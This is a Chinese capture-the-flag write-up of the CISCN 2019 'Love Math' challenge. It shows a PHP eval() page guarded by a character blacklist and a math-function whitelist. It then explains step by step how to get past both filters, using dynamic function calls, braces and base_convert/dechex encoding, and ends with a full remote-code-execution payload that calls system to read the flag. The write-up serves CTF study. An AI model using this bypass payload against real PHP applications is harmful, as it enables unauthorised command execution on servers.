# 【CISCN 2019初赛】Love Math


# [CISCN 2019初赛]Love Math

## 思路
* 源码

  ```
  &lt;?php
  error_reporting(0);
  //听说你很喜欢数学，不知道你是否爱它胜过爱flag
  if(!isset($_GET[&#39;c&#39;])){
      show_source(__FILE__);
  }else{
      //例子 c=20-1
      $content = $_GET[&#39;c&#39;];
      if (strlen($content) &gt;= 80) {
          die(&#34;太长了不会算&#34;);
      }
      $blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&#34;&#39;, &#39;`&#39;, &#39;\[&#39;, &#39;\]&#39;];
      foreach ($blacklist as $blackitem) {
          if (preg_match(&#39;/&#39; . $blackitem . &#39;/m&#39;, $content)) {
              die(&#34;请不要输入奇奇怪怪的字符&#34;);
          }
      }
      //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
      $whitelist = [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];
      preg_match_all(&#39;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#39;, $content, $used_funcs);  
      foreach ($used_funcs[0] as $func) {
          if (!in_array($func, $whitelist)) {
              die(&#34;请不要输入奇奇怪怪的函数&#34;);
          }
      }
      //帮你算出答案
      eval(&#39;echo &#39;.$content.&#39;;&#39;);
  }
  ```
  
  有好几个过滤
  
  * 长度大于80过滤
  
  * 黑名单过滤：关键问题是过滤了`[`、`]`
  
    ```
    blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&#34;&#39;, &#39;`&#39;, &#39;\[&#39;, &#39;\]&#39;];
    ```
  
  * 白名单过滤：主要是只能使用部分数学的函数
  
    ```
    whitelist = [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];
    ```
  
  * 过滤了ascci码形式的值
  
    ```
    preg_match_all(&#39;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#39;, $content, $used_funcs);
    ```
  
* 对于黑名单绕过

  常规的`cat /flag`都不能使用了

  &gt; [!NOTE]
  &gt;
  &gt; **知识点**
  &gt;
  &gt; php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数

  传参为：

  ```
  ?c=($_GET[a])($_GET[b])&amp;a=system&amp;b=cat /flag
  ```

  黑名单还过滤了`[`，` ]`

  把这个替换为`{`，`}`

  ```
  ?c=($_GET{a})($_GET{b})&amp;a=system&amp;b=cat /flag
  ```

* 对于白名单绕过

  不在白名单的部分

  * `a`

  * `b`

  * `_GET`

    &gt;  因为`_GET`难绕过，下面单列来说

  `a`和`b`很好绕过：使用白名单的随便一个数学函数作为命名就行

  ```
  ?c=($_GET{cos})($_GET{asinh})&amp;cos=system&amp;asinh=cat /flag
  ```

* `_GET[]`绕过方法

  &gt; 使用数学函数

  * `hex2bin()`

    把十六进制字符串转换为ASCII字符

    `_GET` =&gt; `hex2bin(5f 47 45 54)` 

    但问题是：`hex2bin`不在白名单；ascci字符码也会被第三道过滤

  * `hex2bin`不在白名单解决

    使用`base_convert()`函数来转换

    &gt; `base_convert()`：任意进制之间转换数字

    使用方法：

    hex2bin可以看做是36进制，用base_convert来转换将在**10进制的数字转换为16进制**就可以出现hex2bin。

     `hex2bin()`  =&gt; `base_convert(37907361743,10,36)`

    里面的`5f 47 45 54`要用dechex()函数将**10进制数转换为16进制**的数

    `5f 47 45 54` =&gt; `dechex(1598506324)`

    经过上面修改变为：

    ```
    ?c=($((base_convert(37907361743,10,36))(dechex(1598506324))){cos})($(base_convert(37907361743,10,36))(dechex(1598506324))){asinh})&amp;cos=system&amp;asinh=cat /flag
    ```

* 但这个指令太长了

  综述再修改：

  ```
  base_convert(37907361743,10,36)		# “hex2bin”
  dechex(1598506324)		# “5f474554”
  $pi=hex2bin(5f474554)		# $pi=&#34;_GET&#34;
  ($$pi){pi}(($$pi){abs})		# $_GET{pi}($_GET{abs})
  $_GET{pi}($_GET{abs})		# $_GET{system}($_GET{cat /flag})
  ```


## Payload

```
/?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&amp;pi=system&amp;abs=cat /flag
```

## 总结

* RCE
* 黑名单
* 白名单

---

> Author: [Ting](Tin10g.github.io)  
> URL: http://localhost:1313/posts/2024%E5%81%9A%E9%A2%98-ciscn-2019%E5%88%9D%E8%B5%9Blove-math/  

